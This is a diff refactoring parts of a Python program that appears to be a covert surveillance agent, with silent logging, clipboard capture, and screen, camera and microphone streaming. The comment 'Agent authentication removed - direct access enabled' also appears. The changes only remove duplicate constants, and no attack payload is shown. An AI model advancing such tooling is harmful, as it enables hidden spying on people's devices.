@@ -88,6 +88,7 @@ DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated atte
 import logging
 import io
 import sys
+import tempfile
 
 def setup_silent_logging():
     """Setup logging system that doesn't output to console"""
@@ -3528,23 +3529,7 @@ CLIPBOARD_BUFFER = []
 LAST_CLIPBOARD_CONTENT = ""
 
 # --- Audio Config ---
-if PYAUDIO_AVAILABLE:
-    try:
-        CHUNK = 1024
-        FORMAT = pyaudio.paInt16
-        CHANNELS = 1
-        RATE = 44100
-    except AttributeError:
-        # pyaudio imported but constants not available
-        CHUNK = 1024
-        FORMAT = None
-        CHANNELS = 1
-        RATE = 44100
-else:
-    CHUNK = 1024
-    FORMAT = None
-    CHANNELS = 1
-    RATE = 44100
+# Note: Audio constants are defined globally above
 
 def get_or_create_agent_id():
     """
@@ -3587,10 +3572,7 @@ def stream_screen(agent_id):
 
 # Modern H.264 camera streaming pipeline variables
 # Note: CAMERA_STREAMING_ENABLED and CAMERA_STREAM_THREADS already defined in global state section
-
-TARGET_CAMERA_FPS = 15
-CAMERA_CAPTURE_QUEUE_SIZE = 5
-CAMERA_ENCODE_QUEUE_SIZE = 5
+# TARGET_CAMERA_FPS, CAMERA_CAPTURE_QUEUE_SIZE, CAMERA_ENCODE_QUEUE_SIZE are defined globally
 
 def camera_capture_worker(agent_id):
     """Capture camera frames and put in capture queue."""
@@ -3767,9 +3749,7 @@ AUDIO_STREAM_THREADS = []
 audio_capture_queue = None
 audio_encode_queue = None
 
-TARGET_AUDIO_FPS = 50  # 50 audio frames per second (20ms chunks)
-AUDIO_CAPTURE_QUEUE_SIZE = 10
-AUDIO_ENCODE_QUEUE_SIZE = 10
+# Note: TARGET_AUDIO_FPS, AUDIO_CAPTURE_QUEUE_SIZE and AUDIO_ENCODE_QUEUE_SIZE are defined globally
 
 def audio_capture_worker(agent_id):
     """Capture audio frames from microphone and put in capture queue."""
@@ -9504,14 +9484,11 @@ if __name__ == "__main__":
 # Agent authentication removed - direct access enabled
 
 # Modern non-blocking streaming pipeline for screen streaming
-STREAMING_ENABLED = False
+# Note: These variables are already defined in the global state section above
+# STREAMING_ENABLED, TARGET_FPS, CAPTURE_QUEUE_SIZE, ENCODE_QUEUE_SIZE are defined globally
 STREAM_THREADS = []
 capture_queue = None
 encode_queue = None
-
-TARGET_FPS = 15
-CAPTURE_QUEUE_SIZE = 5
-ENCODE_QUEUE_SIZE = 5
 
 
 def screen_capture_worker(agent_id):
